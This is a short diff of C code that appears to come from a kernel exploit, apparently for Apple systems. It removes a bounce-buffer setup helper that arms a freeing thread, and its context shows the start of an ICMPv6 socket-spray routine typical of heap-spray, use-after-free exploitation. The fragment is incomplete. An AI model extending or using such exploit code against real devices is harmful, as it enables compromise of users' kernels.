@@ -207,17 +207,6 @@ void *free_thread(void *arg) {
     return NULL;
 }
 
-bool initialize_bounce_buffer(uint64_t size) {
-    pcSize = size;
-    if (!create_bounce_buffer(&pcObject, &pcAddress, pcSize))
-        return false;
-    freeTarget = pcAddress;
-    freeTargetSize = pcSize;
-    freeThreadStart = 1;
-    goSync = 1;
-    return true;
-}
-
 fileport_t spray_socket(void) {
     int fd = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);
     if (fd < 0) return -1;
